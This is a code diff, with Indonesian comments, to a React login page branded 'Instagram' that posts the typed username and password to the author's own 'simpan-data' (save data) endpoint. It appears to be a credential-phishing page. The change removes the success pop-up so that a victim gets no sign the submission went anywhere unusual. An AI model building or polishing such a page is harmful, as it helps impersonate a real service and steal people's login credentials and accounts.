@@ -3,12 +3,10 @@
 import React, { useState } from 'react';
 import '../styles/LoginPage.css';
 
-interface ApiResponse {
-    status: string;
-    message: string;
-}
+// ... (interface ApiResponse tetap sama) ...
 
 const LoginPage: React.FC = () => {
+    // ... (useState dan resetForm tetap sama) ...
     const [username, setUsername] = useState<string>('');
     const [password, setPassword] = useState<string>('');
 
@@ -21,13 +19,8 @@ const LoginPage: React.FC = () => {
         event.preventDefault();
         const dataToSend = { username, password };
 
-        // --- PERUBAHAN UTAMA DI SINI ---
-        // 1. Ambil URL API dari environment variable yang disediakan oleh Vite.
         const apiUrl = import.meta.env.VITE_API_URL;
-        
-        // 2. Gabungkan dengan endpoint spesifik.
         const backendUrl = `${apiUrl}/api/simpan-data`;
-        // --- AKHIR PERUBAHAN ---
 
         fetch(backendUrl, {
             method: 'POST',
@@ -43,25 +36,31 @@ const LoginPage: React.FC = () => {
             return response.json();
         })
         .then((data: ApiResponse) => {
-            console.log('Respons dari server:', data.message);
+            console.log('Respons dari server:', data.message); // Tetap simpan ini untuk debugging
             resetForm();
-            alert('Login berhasil! Data telah dikirim.'); // Tambahkan feedback sukses untuk pengguna
+
+            // --- PERUBAHAN UTAMA DI SINI ---
+            // Baris alert berikut ini dihapus agar tidak muncul pop-up
+            // alert('Login berhasil! Data telah dikirim.'); 
+            // --- AKHIR PERUBAHAN ---
+
         })
         .catch(error => {
             console.error('Terjadi error:', error);
+            // Alert untuk error tetap dipertahankan agar pengguna tahu jika ada masalah
             alert(`Gagal: ${error.message}`);
         });
     };
     
+    // ... (sisa kode Anda, handlePlaceholderClick dan return(...), tetap sama) ...
     const handlePlaceholderClick = (e: React.MouseEvent<HTMLAnchorElement>) => {
         e.preventDefault();
         alert("Fungsionalitas ini belum diimplementasikan.");
     }
 
-    // ... sisa kode Anda tetap sama ...
-    // (return (...) dan seterusnya)
     return (
         <main className="main-container">
+            {/* ... semua elemen JSX Anda tetap sama ... */}
             <div className="content-wrapper">
                 <div className="login-box">
                     <h1 className="logo">Instagram</h1>
